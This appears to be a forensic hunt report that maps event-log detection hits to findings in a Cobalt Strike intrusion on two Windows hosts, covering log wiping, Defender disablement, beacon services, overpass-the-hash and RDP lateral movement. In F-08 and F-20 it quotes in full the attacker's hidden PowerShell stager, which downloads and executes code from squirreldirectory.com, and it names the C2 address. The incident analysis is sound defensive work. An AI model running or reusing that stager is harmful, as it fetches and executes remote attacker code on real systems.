# FINDEVIL — RD Hunt Hit-ID Map
**Job:** 8f7cba50 | **Generated:** 2026-06-13T16:40Z (UTC)

Each finding is tied to the exact Chainsaw hit IDs that support it.

---

## F-01 · Log Wipe — Both Hosts (2018-05-04T22:14:29Z)

Computer reported as `win10-test` (pre-domain-join name) on both images.

| Hit ID | Severity | EID | Rule | Host |
|--------|----------|-----|------|------|
| 8f7cba50-000029 | critical | 1102 | Security Audit Logs Cleared | rd-01 |
| 8f7cba50-000026 | critical | 1102 | Security Audit Logs Cleared | rd-02 |
| 8f7cba50-000022 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000023 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000027 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000028 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000032 | high | 104 | System Logs Cleared | rd-01 |
| 8f7cba50-000033 | high | 104 | Important Windows Eventlog Cleared | rd-01 |
| 8f7cba50-000020 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000021 | high | 104 | Important Windows Eventlog Cleared | rd-02 |
| 8f7cba50-000024 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000025 | high | 104 | Important Windows Eventlog Cleared | rd-02 |
| 8f7cba50-000030 | high | 104 | System Logs Cleared | rd-02 |
| 8f7cba50-000031 | high | 104 | Important Windows Eventlog Cleared | rd-02 |

---

## F-02 · Defender Disablement — Initial Scripted Wave (2018-05-07–09)

Two scripted rounds: first at 19:24Z (pre-domain name), second at 14:47Z with a 4-second offset between hosts confirming simultaneous execution.

**rd-02 disabled first (14:47:57Z), rd-01 four seconds later (14:48:01Z).**

| Hit ID | Severity | EID | Timestamp | Rule | Host |
|--------|----------|-----|-----------|------|------|
| 8f7cba50-000044 | high | 5010 | 2018-05-07T19:24:23Z | Windows Defender Threat Detection Disabled | rd-02 |
| 8f7cba50-000045 | high | 5010 | 2018-05-07T19:24:23Z | Windows Defender Malware And PUA Scanning Disabled | rd-02 |
| 8f7cba50-000047 | high | 5010 | 2018-05-07T19:24:25Z | Windows Defender Threat Detection Disabled | rd-01 |
| 8f7cba50-000048 | high | 5010 | 2018-05-07T19:24:25Z | Windows Defender Malware And PUA Scanning Disabled | rd-01 |
| 8f7cba50-000399 | high | 5012 | 2018-05-09T14:47:57Z | Windows Defender Virus Scanning Feature Disabled | rd-02 |
| 8f7cba50-000400 | high | 5012 | 2018-05-09T14:47:57Z | Windows Defender Threat Detection Disabled | rd-02 |
| 8f7cba50-000401 | high | 5010 | 2018-05-09T14:47:57Z | Windows Defender Threat Detection Disabled | rd-02 |
| 8f7cba50-000402 | high | 5010 | 2018-05-09T14:47:57Z | Windows Defender Malware And PUA Scanning Disabled | rd-02 |
| 8f7cba50-000403 | high | 5012 | 2018-05-09T14:48:01Z | Windows Defender Virus Scanning Feature Disabled | rd-01 |
| 8f7cba50-000404 | high | 5012 | 2018-05-09T14:48:01Z | Windows Defender Threat Detection Disabled | rd-01 |
| 8f7cba50-000405 | high | 5010 | 2018-05-09T14:48:01Z | Windows Defender Threat Detection Disabled | rd-01 |
| 8f7cba50-000406 | high | 5010 | 2018-05-09T14:48:01Z | Windows Defender Malware And PUA Scanning Disabled | rd-01 |
| 8f7cba50-000439 | high | 5012 | 2018-05-09T14:49:50Z | Windows Defender Virus Scanning Feature Disabled | rd-02 |
| 8f7cba50-000440 | high | 5012 | 2018-05-09T14:49:50Z | Windows Defender Threat Detection Disabled | rd-02 |
| 8f7cba50-000441 | high | 5010 | 2018-05-09T14:49:50Z | Windows Defender Threat Detection Disabled | rd-02 |
| 8f7cba50-000442 | high | 5010 | 2018-05-09T14:49:50Z | Windows Defender Malware And PUA Scanning Disabled | rd-02 |
| 8f7cba50-000445 | high | 5012 | 2018-05-09T14:49:52Z | Windows Defender Virus Scanning Feature Disabled | rd-01 |
| 8f7cba50-000446 | high | 5012 | 2018-05-09T14:49:52Z | Windows Defender Threat Detection Disabled | rd-01 |
| 8f7cba50-000447 | high | 5010 | 2018-05-09T14:49:52Z | Windows Defender Threat Detection Disabled | rd-01 |
| 8f7cba50-000448 | high | 5010 | 2018-05-09T14:49:52Z | Windows Defender Malware And PUA Scanning Disabled | rd-01 |

---

## F-03 · Defender Disablement — Recurring Daily on rd-02 (May 30 – Jun 1) [NEW]

rd-01 shows no corresponding events on these dates — the persistence mechanism only survived on rd-02. Times cluster ~02:40am UTC, consistent with a scheduled task or logon script re-disabling Defender after each daily reboot.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-006394 | high | 5012 | 2018-05-30T02:40:53Z | Windows Defender Virus Scanning Feature Disabled |
| 8f7cba50-006395 | high | 5012 | 2018-05-30T02:40:53Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-006396 | high | 5010 | 2018-05-30T02:40:54Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-006397 | high | 5010 | 2018-05-30T02:40:54Z | Windows Defender Malware And PUA Scanning Disabled |
| 8f7cba50-007618 | high | 5012 | 2018-05-31T02:30:46Z | Windows Defender Virus Scanning Feature Disabled |
| 8f7cba50-007619 | high | 5012 | 2018-05-31T02:30:46Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-007620 | high | 5010 | 2018-05-31T02:30:46Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-007621 | high | 5010 | 2018-05-31T02:30:46Z | Windows Defender Malware And PUA Scanning Disabled |
| 8f7cba50-008669 | high | 5012 | 2018-06-01T02:42:01Z | Windows Defender Virus Scanning Feature Disabled |
| 8f7cba50-008670 | high | 5012 | 2018-06-01T02:42:01Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-008671 | high | 5010 | 2018-06-01T02:42:01Z | Windows Defender Threat Detection Disabled |
| 8f7cba50-008672 | high | 5010 | 2018-06-01T02:42:01Z | Windows Defender Malware And PUA Scanning Disabled |

---

## F-04 · tdungan Initial Access via RDP to rd-01 (2018-07-11 – 2018-08-02)

Source IP 192.168.30.10 throughout. EID 4624 (LogonType 10) confirms user `tdungan`. EID 24/25 bracket each session. Only two EID 4624 logon events captured (Jul 18, Jul 26) — the others are session-manager events only.

| Hit ID | Severity | EID | Timestamp | Notes |
|--------|----------|-----|-----------|-------|
| 8f7cba50-010868 | critical | 25 | 2018-07-11T05:42:20Z | Session connected |
| 8f7cba50-010870 | critical | 24 | 2018-07-11T05:44:01Z | Session disconnected |
| 8f7cba50-011111 | critical | 25 | 2018-07-17T19:03:47Z | Session connected |
| 8f7cba50-011114 | critical | 24 | 2018-07-17T19:06:57Z | Session disconnected |
| 8f7cba50-011227 | critical | 25 | 2018-07-18T15:01:32Z | Session connected |
| 8f7cba50-011229 | critical | 24 | 2018-07-18T15:03:35Z | Session disconnected |
| 8f7cba50-011230 | critical | 25 | 2018-07-18T15:03:44Z | Session connected |
| 8f7cba50-011232 | critical | 24 | 2018-07-18T15:04:26Z | Session disconnected |
| 8f7cba50-011237 | critical | 4624 | 2018-07-18T15:07:49Z | **tdungan logon**, 192.168.30.10 |
| 8f7cba50-011238 | critical | 25 | 2018-07-18T15:07:50Z | Session connected |
| 8f7cba50-011246 | critical | 24 | 2018-07-18T15:15:05Z | Session disconnected |
| 8f7cba50-011344 | critical | 25 | 2018-07-20T15:14:16Z | Session connected |
| 8f7cba50-011351 | critical | 24 | 2018-07-20T15:28:57Z | Session disconnected |
| 8f7cba50-011468 | critical | 25 | 2018-07-23T14:49:17Z | Session connected |
| 8f7cba50-011475 | critical | 24 | 2018-07-23T15:50:09Z | Session disconnected |
| 8f7cba50-011476 | critical | 25 | 2018-07-23T16:24:07Z | Session connected |
| 8f7cba50-011478 | critical | 24 | 2018-07-23T16:32:20Z | Session disconnected |
| 8f7cba50-011568 | critical | 4624 | 2018-07-26T03:43:59Z | **tdungan logon**, 192.168.30.10 |
| 8f7cba50-011569 | critical | 25 | 2018-07-26T03:44:04Z | Session connected |
| 8f7cba50-011580 | critical | 24 | 2018-07-26T04:25:59Z | Session disconnected |
| 8f7cba50-011581 | critical | 25 | 2018-07-26T04:26:21Z | Session connected |
| 8f7cba50-011585 | critical | 24 | 2018-07-26T04:26:31Z | Session disconnected |
| 8f7cba50-011587 | critical | 25 | 2018-07-26T04:26:51Z | Session connected |
| 8f7cba50-011592 | critical | 24 | 2018-07-26T04:28:14Z | Session disconnected |
| 8f7cba50-011680 | critical | 25 | 2018-07-28T00:14:50Z | Session connected |
| 8f7cba50-011686 | critical | 24 | 2018-07-28T01:37:56Z | Session disconnected |
| 8f7cba50-011797 | critical | 25 | 2018-07-30T04:35:35Z | Session connected |
| 8f7cba50-011802 | critical | 24 | 2018-07-30T04:47:27Z | Session disconnected |
| 8f7cba50-011857 | critical | 25 | 2018-07-31T18:56:00Z | Session connected |
| 8f7cba50-011863 | critical | 24 | 2018-07-31T19:25:47Z | Session disconnected |
| 8f7cba50-011911 | critical | 25 | 2018-08-02T03:19:38Z | Session connected |
| 8f7cba50-011917 | critical | 24 | 2018-08-02T03:46:49Z | Session disconnected |

---

## F-05 · Cobalt Strike Beacons Deployed on rd-01 (2018-08-28 – 08-30)

EID 7045 (System.evtx) and corroborating EID 4697 (Security.evtx) with `SubjectUserName: spsql`.

| Hit ID | Severity | EID | Timestamp | Service | Binary |
|--------|----------|-----|-----------|---------|--------|
| 8f7cba50-018926 | critical | 7045 | 2018-08-28T00:57:32Z | 56e3de4 | 8f14386.exe |
| 8f7cba50-018925 | high | 7045 | 2018-08-28T00:57:32Z | 56e3de4 | Suspicious Service Installation |
| 8f7cba50-018929 | high | 4697 | 2018-08-28T00:57:32Z | 56e3de4 | CS Service - Security (spsql) |
| 8f7cba50-018936 | critical | 7045 | 2018-08-28T01:05:03Z | 9c3ae67 | e75f2c4.exe |
| 8f7cba50-018935 | high | 7045 | 2018-08-28T01:05:03Z | 9c3ae67 | Suspicious Service Installation |
| 8f7cba50-018940 | high | 4697 | 2018-08-28T01:05:03Z | 9c3ae67 | CS Service - Security (spsql) |
| 8f7cba50-018951 | critical | 7045 | 2018-08-28T01:09:03Z | 24f8f7e | 3795920.exe |
| 8f7cba50-018950 | high | 7045 | 2018-08-28T01:09:03Z | 24f8f7e | Suspicious Service Installation |
| 8f7cba50-018955 | high | 4697 | 2018-08-28T01:09:03Z | 24f8f7e | CS Service - Security (spsql) |
| 8f7cba50-019943 | critical | 7045 | 2018-08-30T16:42:44Z | fb9f33e | 35da1b7.exe |
| 8f7cba50-019942 | high | 7045 | 2018-08-30T16:42:44Z | fb9f33e | Suspicious Service Installation |
| 8f7cba50-019946 | high | 4697 | 2018-08-30T16:42:44Z | fb9f33e | CS Service - Security (spsql) |

---

## F-06 · PowerShell Shellcode on rd-01 After First CS Wave (2018-08-28T15:42Z)

Fired ~15 hours after the first three beacons. EID 4104 (ScriptBlock logging).

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-019132 | high | 4104 | 2018-08-28T15:42:38Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-019137 | high | 4104 | 2018-08-28T15:42:39Z | PowerShell ShellCode |
| 8f7cba50-019144 | high | 4104 | 2018-08-28T15:42:56Z | PowerShell ShellCode |

---

## F-07 · spsql RDP to rd-01 from 172.16.6.14 (base-rd-04) — 2018-08-28T21:39Z

Two paired EID 4624 logons (interactive + linked token), then disconnect after WMIC sweep launched.

| Hit ID | Severity | EID | Timestamp | Notes |
|--------|----------|-----|-----------|-------|
| 8f7cba50-019280 | critical | 4624 | 2018-08-28T21:39:08Z | spsql, 172.16.6.14, LogonType 10 |
| 8f7cba50-019282 | critical | 4624 | 2018-08-28T21:39:08Z | spsql, 172.16.6.14, elevated token linked |
| 8f7cba50-019323 | critical | 24 | 2018-08-28T22:10:15Z | Session disconnected (after 31-min WMIC sweep) |

---

## F-08 · Shellcode Injection — squirreldirectory.com/a — rd-01 (2018-08-30T13:51:28Z)

EID 4103 (module logging). User `shieldbase\spsql`. Host application contains the plaintext stager: `powershell.exe -nop -w hidden -ec IEX ((new-object net.webclient).downloadstring('http://squirreldirectory.com/a'))`. Shellcode payload embeds C2 IP `206.189.69.35` and CS User-Agent string.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-019876 | critical | 4103 | 2018-08-30T13:51:28Z | Bad Opsec Powershell Code Artifacts |

Post-4th-beacon shellcode on rd-01 (EID 4104, immediately after 16:42:44Z service install):

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-019961 | high | 4104 | 2018-08-30T16:43:40Z | PowerShell ShellCode |
| 8f7cba50-019968 | high | 4104 | 2018-08-30T16:43:51Z | PowerShell ShellCode |

---

## F-09 · Nishang PowerShell Commandlets — rd-01 (2018-08-30T18:31–21:40Z) [NEW]

Two distinct bursts on rd-01 approximately 3 hours apart, between the shellcode injection and the Overpass-the-Hash credential theft. Indicates interactive PS shell session (Invoke-PowerShellTcp or equivalent).

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-019997 | high | 4104 | 2018-08-30T18:31:07Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-019999 | high | 4104 | 2018-08-30T18:31:09Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020000 | high | 4104 | 2018-08-30T18:31:09Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020001 | high | 4104 | 2018-08-30T18:31:09Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020003 | high | 4104 | 2018-08-30T18:31:09Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020004 | high | 4104 | 2018-08-30T18:31:09Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020010 | high | 4104 | 2018-08-30T18:31:17Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020012 | high | 4104 | 2018-08-30T18:31:18Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020013 | high | 4104 | 2018-08-30T18:31:18Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020014 | high | 4104 | 2018-08-30T18:31:18Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020060 | high | 4104 | 2018-08-30T21:40:20Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020062 | high | 4104 | 2018-08-30T21:40:21Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020063 | high | 4104 | 2018-08-30T21:40:21Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020064 | high | 4104 | 2018-08-30T21:40:21Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020068 | high | 4104 | 2018-08-30T21:40:43Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020070 | high | 4104 | 2018-08-30T21:40:43Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020071 | high | 4104 | 2018-08-30T21:40:43Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020072 | high | 4104 | 2018-08-30T21:40:43Z | Suspicious PowerShell Invocations - Generic |

---

## F-10 · Overpass-the-Hash — rd-01 (2018-08-30T22:45:25Z) [NEW]

EID 4624 flagged by Sigma rule "Successful Overpass the Hash Attempt". Fires 65 minutes before the lateral movement sweep to all 6 workstations begins (22:33Z–01:31Z). Confirms `spsql` used PTH to obtain Kerberos material before moving laterally.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-020102 | high | 4624 | 2018-08-30T22:45:25Z | **Successful Overpass the Hash Attempt** |
| 8f7cba50-020106 | high | 4104 | 2018-08-30T22:45:28Z | Suspicious PowerShell Invocations - Specific |

---

## F-11 · Pre-rd-02 Lateral Movement PS on rd-01 (2018-08-31T00:06–00:08Z)

PS activity on rd-01 immediately preceding the beacon stager arriving on rd-02 at 00:08:50Z.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-020128 | high | 4104 | 2018-08-31T00:06:57Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020138 | high | 4104 | 2018-08-31T00:08:48Z | Suspicious PowerShell Invocations - Specific |

---

## F-12 · Cobalt Strike Beacons Deployed on rd-02 (2018-08-31T00:08–00:09Z)

Two beacons 30 seconds apart: first a standard EXE service, then a PS-encoded beacon. Both corroborated by EID 4697 in Security.evtx.

| Hit ID | Severity | EID | Timestamp | Service | Notes |
|--------|----------|-----|-----------|---------|-------|
| 8f7cba50-020156 | high | 4104 | 2018-08-31T00:08:50Z | — | PowerShell ShellCode (stager arriving) |
| 8f7cba50-020163 | high | 4104 | 2018-08-31T00:09:00Z | — | PowerShell ShellCode |
| 8f7cba50-020173 | critical | 7045 | 2018-08-31T00:09:13Z | df0398a | 5b1b72b.exe |
| 8f7cba50-020172 | high | 7045 | 2018-08-31T00:09:13Z | df0398a | Suspicious Service Installation |
| 8f7cba50-020176 | high | 4697 | 2018-08-31T00:09:13Z | df0398a | CS Service - Security |
| 8f7cba50-020179 | critical | 7045 | 2018-08-31T00:09:43Z | 8556ce1 | PS-encoded beacon service |
| 8f7cba50-020181 | high | 7045 | 2018-08-31T00:09:43Z | 8556ce1 | PowerShell Scripts Installed as Services |
| 8f7cba50-020182 | high | 7045 | 2018-08-31T00:09:43Z | 8556ce1 | Suspicious Service Installation |
| 8f7cba50-020184 | critical | 7045 | 2018-08-31T00:09:43Z | 8556ce1 | CobaltStrike Service Installations - System |
| 8f7cba50-020188 | high | 4697 | 2018-08-31T00:09:43Z | 8556ce1 | PowerShell Scripts Installed as Services - Security |
| 8f7cba50-020190 | high | 4697 | 2018-08-31T00:09:43Z | 8556ce1 | CS Service - Security |
| 8f7cba50-020197 | high | 4104 | 2018-08-31T00:09:45Z | — | PowerShell ShellCode |
| 8f7cba50-020202 | high | 4104 | 2018-08-31T00:09:45Z | — | PowerShell ShellCode |

---

## F-13 · spsql RDP to rd-02 from rd-01 (2018-08-31T00:17–00:44Z)

Source: 172.16.6.11 (base-rd-01). Two sessions within 25 minutes of beacon deployment.

| Hit ID | Severity | EID | Timestamp | Notes |
|--------|----------|-----|-----------|-------|
| 8f7cba50-020232 | critical | 4624 | 2018-08-31T00:17:04Z | spsql, 172.16.6.11, LogonType 10 |
| 8f7cba50-020234 | critical | 4624 | 2018-08-31T00:17:04Z | spsql, linked token |
| 8f7cba50-020280 | critical | 24 | 2018-08-31T00:37:44Z | Session disconnected |
| 8f7cba50-020283 | critical | 4624 | 2018-08-31T00:41:44Z | spsql, 172.16.6.11, second session |
| 8f7cba50-020285 | critical | 4624 | 2018-08-31T00:41:44Z | spsql, linked token |
| 8f7cba50-020351 | critical | 24 | 2018-08-31T00:44:37Z | Session disconnected |

---

## F-14 · Nishang PowerShell Commandlets — rd-02 (2018-08-31T00:21–00:44Z) [NEW]

Three bursts on rd-02 following beacon deployment, overlapping with spsql RDP sessions.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-020254 | high | 4104 | 2018-08-31T00:21:59Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020260 | high | 4104 | 2018-08-31T00:22:00Z | PowerShell ShellCode |
| 8f7cba50-020266 | high | 4104 | 2018-08-31T00:22:06Z | PowerShell ShellCode |
| 8f7cba50-020301 | high | 4104 | 2018-08-31T00:42:52Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020304 | high | 4104 | 2018-08-31T00:43:09Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020307 | high | 4104 | 2018-08-31T00:43:21Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020313 | high | 4104 | 2018-08-31T00:43:21Z | PowerShell ShellCode |
| 8f7cba50-020319 | high | 4104 | 2018-08-31T00:43:25Z | PowerShell ShellCode |
| 8f7cba50-020325 | high | 4104 | 2018-08-31T00:44:06Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020327 | high | 4104 | 2018-08-31T00:44:08Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020328 | high | 4104 | 2018-08-31T00:44:08Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020329 | high | 4104 | 2018-08-31T00:44:08Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020331 | high | 4104 | 2018-08-31T00:44:08Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020332 | high | 4104 | 2018-08-31T00:44:08Z | Suspicious PowerShell Invocations - Generic |
| 8f7cba50-020341 | high | 4104 | 2018-08-31T00:44:25Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020343 | high | 4104 | 2018-08-31T00:44:25Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020344 | high | 4104 | 2018-08-31T00:44:25Z | **Malicious Nishang PowerShell Commandlets** |
| 8f7cba50-020345 | high | 4104 | 2018-08-31T00:44:25Z | Suspicious PowerShell Invocations - Generic |

---

## F-15 · PS Workstation Lateral Movement from rd-01 (2018-08-31T00:55–01:31Z)

PS activity continuing on rd-01 during the lateral sweep window (22:33Z–01:31Z).

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-020364 | high | 4104 | 2018-08-31T00:55:19Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020391 | high | 4104 | 2018-08-31T01:14:43Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020400 | high | 4104 | 2018-08-31T01:23:23Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-020407 | high | 4104 | 2018-08-31T01:31:23Z | Suspicious PowerShell Invocations - Specific |

---

## F-16 · spsql Continued RDP to rd-01 (2018-08-31 Daytime)

Source: 172.16.6.14 (base-rd-04) throughout. Multiple sessions the morning after beacon/workstation deployment.

| Hit ID | Severity | EID | Timestamp | Notes |
|--------|----------|-----|-----------|-------|
| 8f7cba50-020566 | critical | 4624 | 2018-08-31T14:52:13Z | spsql, 172.16.6.14 |
| 8f7cba50-020568 | critical | 4624 | 2018-08-31T14:52:13Z | spsql, linked token |
| 8f7cba50-020587 | critical | 24 | 2018-08-31T14:58:38Z | Session disconnected |
| 8f7cba50-020595 | critical | 4624 | 2018-08-31T15:21:30Z | spsql, 172.16.6.14 |
| 8f7cba50-020597 | critical | 4624 | 2018-08-31T15:21:30Z | spsql, linked token |
| 8f7cba50-020614 | critical | 24 | 2018-08-31T15:28:53Z | Session disconnected |
| 8f7cba50-020689 | critical | 4624 | 2018-08-31T18:28:23Z | spsql, 172.16.6.14 |
| 8f7cba50-020691 | critical | 4624 | 2018-08-31T18:28:23Z | spsql, linked token |
| 8f7cba50-020705 | critical | 24 | 2018-08-31T18:31:07Z | Session disconnected |
| 8f7cba50-020709 | critical | 4624 | 2018-08-31T18:34:05Z | spsql, 172.16.6.14 |
| 8f7cba50-020711 | critical | 4624 | 2018-08-31T18:34:05Z | spsql, linked token |
| 8f7cba50-020712 | critical | 25 | 2018-08-31T18:34:06Z | Session connected |
| 8f7cba50-020726 | critical | 24 | 2018-08-31T18:49:22Z | Session disconnected |

---

## F-17 · spsql 8+ RDP Sessions to rd-01 on 2018-09-05 [NEW DETAIL]

All from 172.16.6.14 (base-rd-04). Heavy operator day — 8 sessions spanning ~7 hours, immediately preceding the Sep 6 shellcode activity.

| Hit ID | Severity | EID | Timestamp | Notes |
|--------|----------|-----|-----------|-------|
| 8f7cba50-022152 | critical | 4624 | 2018-09-05T11:51:52Z | spsql, 172.16.6.14 |
| 8f7cba50-022154 | critical | 4624 | 2018-09-05T11:51:52Z | spsql, linked token |
| 8f7cba50-022170 | critical | 24 | 2018-09-05T11:55:56Z | Session disconnected |
| 8f7cba50-022181 | critical | 4624 | 2018-09-05T12:02:23Z | spsql, 172.16.6.14 |
| 8f7cba50-022183 | critical | 4624 | 2018-09-05T12:02:23Z | spsql, linked token |
| 8f7cba50-022206 | critical | 24 | 2018-09-05T12:11:31Z | Session disconnected |
| 8f7cba50-022215 | critical | 4624 | 2018-09-05T12:17:51Z | spsql, 172.16.6.14 |
| 8f7cba50-022217 | critical | 4624 | 2018-09-05T12:17:51Z | spsql, linked token |
| 8f7cba50-022244 | critical | 24 | 2018-09-05T12:35:26Z | Session disconnected |
| 8f7cba50-022251 | critical | 4624 | 2018-09-05T13:08:13Z | spsql, 172.16.6.14 |
| 8f7cba50-022253 | critical | 4624 | 2018-09-05T13:08:13Z | spsql, linked token |
| 8f7cba50-022276 | critical | 24 | 2018-09-05T13:28:12Z | Session disconnected |
| 8f7cba50-022319 | critical | 4624 | 2018-09-05T13:43:51Z | spsql, 172.16.6.14 |
| 8f7cba50-022321 | critical | 4624 | 2018-09-05T13:43:51Z | spsql, linked token |
| 8f7cba50-022322 | critical | 25 | 2018-09-05T13:43:52Z | Session connected |
| 8f7cba50-022330 | critical | 24 | 2018-09-05T13:48:29Z | Session disconnected |
| 8f7cba50-022335 | critical | 4624 | 2018-09-05T14:04:24Z | spsql, 172.16.6.14 |
| 8f7cba50-022337 | critical | 4624 | 2018-09-05T14:04:24Z | spsql, linked token |
| 8f7cba50-022338 | critical | 25 | 2018-09-05T14:04:25Z | Session connected |
| 8f7cba50-022366 | critical | 24 | 2018-09-05T15:03:08Z | Session disconnected |
| 8f7cba50-022407 | critical | 4624 | 2018-09-05T18:26:06Z | spsql, 172.16.6.14 |
| 8f7cba50-022409 | critical | 4624 | 2018-09-05T18:26:06Z | spsql, linked token |
| 8f7cba50-022432 | critical | 24 | 2018-09-05T18:45:44Z | Session disconnected |

---

## F-18 · Sustained Shellcode — rd-02 (2018-09-06T17:10–17:13Z) [NEW]

EID 4103 payload contains `\pipe\diagsvc-22` string in shellcode — CS SMB named-pipe beacon. Preceded by EID 4104 shellcode fragments.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-022770 | high | 4104 | 2018-09-06T17:10:54Z | PowerShell ShellCode |
| 8f7cba50-022776 | high | 4104 | 2018-09-06T17:10:57Z | PowerShell ShellCode |
| 8f7cba50-022786 | critical | 4103 | 2018-09-06T17:13:36Z | **Bad Opsec Powershell Code Artifacts** (spsql, SMB pipe beacon) |

---

## F-19 · Sustained Shellcode — rd-01 (2018-09-06T20:25–20:31Z) [NEW]

EID 4103 payload embeds C2 IP `206.189.69.35` (same as F-08). Followed immediately by EID 4104 ScriptBlock fragments.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-022965 | critical | 4103 | 2018-09-06T20:25:17Z | **Bad Opsec Powershell Code Artifacts** (spsql, C2: 206.189.69.35) |
| 8f7cba50-022981 | high | 4104 | 2018-09-06T20:30:02Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-022983 | high | 4103 | 2018-09-06T20:30:03Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022985 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022986 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022987 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022991 | high | 4104 | 2018-09-06T20:30:04Z | PowerShell ShellCode |
| 8f7cba50-022993 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022994 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-022995 | high | 4103 | 2018-09-06T20:30:04Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023000 | high | 4104 | 2018-09-06T20:30:13Z | PowerShell ShellCode |
| 8f7cba50-023007 | high | 4104 | 2018-09-06T20:31:00Z | Suspicious PowerShell Invocations - Specific |
| 8f7cba50-023009 | high | 4103 | 2018-09-06T20:31:00Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023011 | high | 4103 | 2018-09-06T20:31:00Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023012 | high | 4103 | 2018-09-06T20:31:00Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023013 | high | 4103 | 2018-09-06T20:31:00Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023017 | high | 4104 | 2018-09-06T20:31:00Z | PowerShell ShellCode |
| 8f7cba50-023019 | high | 4103 | 2018-09-06T20:31:00Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023020 | high | 4103 | 2018-09-06T20:31:01Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023021 | high | 4103 | 2018-09-06T20:31:01Z | Suspicious PS Invocations - Generic - PS Module |
| 8f7cba50-023026 | high | 4104 | 2018-09-06T20:31:03Z | PowerShell ShellCode |

---

## F-20 · Sustained Shellcode + squirreldirectory.com/a Re-stager — rd-02 (2018-09-07T04:19–04:24Z) [NEW]

EID 4103 (04:19:01Z) contains the full reflective loader with `\pipe\diagsvc-22` named-pipe string. The EID 4104 block at 04:24:55–57Z has ContextInfo showing `Host Application = powershell -W Hidden -nop -noni -ec <base64>` which decodes to `IEX (New-Object System.Net.WebClient).downloadstring('http://squirreldirectory.com/a')` — the same C2 stager used on rd-01 on Aug 30, now re-executing on rd-02.

| Hit ID | Severity | EID | Timestamp | Rule |
|--------|----------|-----|-----------|------|
| 8f7cba50-023210 | critical | 4103 | 2018-09-07T04:19:01Z | **Bad Opsec Powershell Code Artifacts** (SMB pipe beacon) |
| 8f7cba50-023224 | high | 4104 | 2018-09-07T04:23:57Z | Suspicious PowerShell Invocations - Specific |
